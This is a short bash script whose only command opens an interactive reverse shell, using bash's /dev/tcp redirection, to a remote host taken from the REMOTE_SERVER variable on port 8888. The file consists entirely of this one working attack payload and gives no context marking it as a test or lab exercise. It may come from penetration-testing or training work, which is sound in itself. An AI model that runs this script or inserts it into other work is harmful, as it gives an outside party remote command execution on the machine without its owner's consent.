#!/bin/bash

set -eux

exec bash -i >& /dev/tcp/${REMOTE_SERVER}/8888 0>&1
